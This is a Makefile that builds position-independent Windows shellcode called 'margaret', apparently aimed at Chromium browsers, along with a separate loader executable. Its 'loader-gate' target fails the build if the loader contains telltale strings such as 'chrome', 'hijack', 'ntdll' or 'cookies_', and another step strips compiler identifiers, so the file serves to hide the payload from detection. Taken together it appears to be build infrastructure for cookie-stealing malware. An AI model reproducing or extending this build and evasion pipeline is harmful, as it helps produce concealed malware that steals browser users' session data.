SHELL := /bin/bash
.DELETE_ON_ERROR:

CC      := x86_64-w64-mingw32-gcc
AS      := x86_64-w64-mingw32-as
LD      := x86_64-w64-mingw32-ld
OBJCOPY := x86_64-w64-mingw32-objcopy
OBJDUMP := x86_64-w64-mingw32-objdump
NM      := x86_64-w64-mingw32-nm
PYTHON  := python3

BUILD_DIR   := build
OBJ_DIR     := $(BUILD_DIR)/obj
MAP_DIR     := $(BUILD_DIR)/map
INSPECT_DIR := $(BUILD_DIR)/inspect
BIN_DIR     := bin

IMAGE     := $(BUILD_DIR)/margaret.x64.exe
MAP_FILE  := $(MAP_DIR)/margaret.x64.map
BLOB       := $(BIN_DIR)/shellcode.bin
HASH_FILE  := $(BIN_DIR)/shellcode.sha256
TOOL_REPORT := $(INSPECT_DIR)/tool-versions.txt
MAX_SIZE   := 65536

# Deliberate order: entry first, C implementation next, terminal marker last.
OBJECTS := \
	$(OBJ_DIR)/entry_x64.obj \
	$(OBJ_DIR)/entry.obj \
	$(OBJ_DIR)/runtime.obj \
	$(OBJ_DIR)/resolve.obj \
	$(OBJ_DIR)/adapter.obj \
	$(OBJ_DIR)/engine_a.obj \
	$(OBJ_DIR)/cc_layout.obj \
	$(OBJ_DIR)/end_x64.obj

CPPFLAGS := -Iinclude
CFLAGS := -m64 -std=c11 -Os \
	-ffreestanding -fno-builtin -fno-stack-protector -fno-common \
	-fno-ident -fno-asynchronous-unwind-tables -fno-unwind-tables \
	-fno-jump-tables -fno-tree-loop-distribute-patterns -fno-store-merging -mno-red-zone \
	-Wall -Wextra -Werror -Wconversion -Wshadow -Wstrict-prototypes \
	-Wmissing-prototypes -Wpointer-arith -Wcast-align=strict
ASFLAGS := --64
LDFLAGS := -m i386pep --entry=margaret_entry --image-base=0 \
	--subsystem windows --no-insert-timestamp \
	-T linker/shellcode.ld -Map=$(MAP_FILE)

.PHONY: all shellcode loader clean inspect size hash tool-versions reproducible loader-gate

all: shellcode
shellcode: $(INSPECT_DIR)/raw-gate.ok

$(BUILD_DIR) $(OBJ_DIR) $(MAP_DIR) $(INSPECT_DIR) $(BIN_DIR):
	@mkdir -p $@

$(OBJ_DIR)/entry_x64.obj: asm/entry_x64.s | $(OBJ_DIR)
	$(AS) $(ASFLAGS) $< -o $@

$(OBJ_DIR)/end_x64.obj: asm/end_x64.s | $(OBJ_DIR)
	$(AS) $(ASFLAGS) $< -o $@

$(OBJ_DIR)/entry.obj: src/entry.c include/margaret.h include/pic_resolve.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/runtime.obj: src/runtime.c include/margaret.h include/pic_resolve.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@

$(OBJ_DIR)/resolve.obj: src/resolve.c include/pic_resolve.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@
$(OBJ_DIR)/adapter.obj: src/adapter.c include/chromium_adapter.h include/pic_resolve.h include/margaret.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@
$(OBJ_DIR)/engine_a.obj: src/engine_a.c include/margaret.h include/chromium_adapter.h include/pic_resolve.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@
$(OBJ_DIR)/cc_layout.obj: src/cc_layout.c include/cc_layout.h include/pic_resolve.h | $(OBJ_DIR)
	$(CC) $(CPPFLAGS) $(CFLAGS) -c $< -o $@

$(TOOL_REPORT): | $(INSPECT_DIR)
	@{ \
		$(CC) --version | head -1; \
		$(AS) --version | head -1; \
		$(LD) --version | head -1; \
		$(OBJCOPY) --version | head -1; \
		$(OBJDUMP) --version | head -1; \
		$(NM) --version | head -1; \
		$(PYTHON) --version; \
		$(MAKE) --version | head -1; \
	} > $@

$(INSPECT_DIR)/object-gate.ok: $(OBJECTS) scripts/verify.py $(TOOL_REPORT) | $(INSPECT_DIR)
	$(PYTHON) scripts/verify.py objects \
		--inspect-dir $(INSPECT_DIR) --objdump $(OBJDUMP) --nm $(NM) \
		$(OBJECTS)

$(IMAGE) $(MAP_FILE) &: $(OBJECTS) $(INSPECT_DIR)/object-gate.ok linker/shellcode.ld | $(BUILD_DIR) $(MAP_DIR)
	$(LD) $(LDFLAGS) $(OBJECTS) -o $(IMAGE)

$(INSPECT_DIR)/linked-gate.ok: $(IMAGE) $(MAP_FILE) scripts/verify.py | $(INSPECT_DIR)
	$(PYTHON) scripts/verify.py linked \
		--inspect-dir $(INSPECT_DIR) --objdump $(OBJDUMP) --nm $(NM) \
		--image $(IMAGE) --map $(MAP_FILE) --max-size $(MAX_SIZE) \
		--objects $(OBJECTS)

$(BLOB): $(IMAGE) $(INSPECT_DIR)/linked-gate.ok | $(BIN_DIR)
	$(OBJCOPY) --only-section=.text --output-target=binary $(IMAGE) $@

$(INSPECT_DIR)/raw-gate.ok $(HASH_FILE) &: $(BLOB) $(IMAGE) scripts/verify.py | $(INSPECT_DIR) $(BIN_DIR)
	$(PYTHON) scripts/verify.py raw \
		--inspect-dir $(INSPECT_DIR) --objcopy $(OBJCOPY) --objdump $(OBJDUMP) \
		--image $(IMAGE) --blob $(BLOB) --hash-file $(HASH_FILE) \
		--map $(MAP_FILE) --max-size $(MAX_SIZE)

inspect: shellcode
	@printf 'Reports: %s\n' "$(INSPECT_DIR)"

size: shellcode
	@wc -c $(BLOB)

hash: $(HASH_FILE)
	@cat $(HASH_FILE)

tool-versions: $(TOOL_REPORT)
	@cat $(TOOL_REPORT)

hash-table:
	@python3 scripts/hash.py --emit
	@printf 'regenerated include/pic_hash_table.h — rebuild to pick it up\n'

hash-audit:
	@python3 scripts/hash.py --audit

reproducible:
	@set -euo pipefail; \
	$(MAKE) --no-print-directory clean >/dev/null; \
	$(MAKE) --no-print-directory shellcode >/dev/null; \
	first_blob="$$(sha256sum $(BLOB) | awk '{print $$1}')"; \
	first_image="$$(sha256sum $(IMAGE) | awk '{print $$1}')"; \
	first_map="$$(sha256sum $(MAP_FILE) | awk '{print $$1}')"; \
	$(MAKE) --no-print-directory clean >/dev/null; \
	$(MAKE) --no-print-directory shellcode >/dev/null; \
	second_blob="$$(sha256sum $(BLOB) | awk '{print $$1}')"; \
	second_image="$$(sha256sum $(IMAGE) | awk '{print $$1}')"; \
	second_map="$$(sha256sum $(MAP_FILE) | awk '{print $$1}')"; \
	test "$$first_blob" = "$$second_blob"; \
	test "$$first_image" = "$$second_image"; \
	test "$$first_map" = "$$second_map"; \
	printf 'reproducible blob:  %s\n' "$$second_blob"; \
	printf 'reproducible image: %s\n' "$$second_image"; \
	printf 'reproducible map:   %s\n' "$$second_map"

clean:
	rm -rf $(BUILD_DIR) $(BIN_DIR)

loader: loader/loader.exe

loader/loader.exe: loader/loader.c loader/lstrings.h
	x86_64-w64-mingw32-gcc -O2 -Wall -s -fno-ident -o $@ loader/loader.c
	python3 scripts/strip_idents.py $@

loader-verbose: loader/loader.c loader/lstrings.h
	x86_64-w64-mingw32-gcc -O2 -Wall -DLOADER_VERBOSE -o loader/loader-verbose.exe loader/loader.c

# loader strings-gate: nessuna stringa rivelatrice nel .exe (quiet build)
loader-gate: loader/loader.exe
	@w=$$(strings -e l loader/loader.exe | grep -icE "chrome|utility|network" || true); \
	 a=$$(strings loader/loader.exe | grep -icE "loader\]|hijack|MCEA|ntdll|NtQuery|chrome|utility|cookies_" || true); \
	 if [ "$$w" != "0" ] || [ "$$a" != "0" ]; then \
	   echo "[verify] loader-strings: FAIL ($$w wide, $$a ascii)"; exit 1; \
	 fi; \
	 echo "[verify] loader-strings: OK"
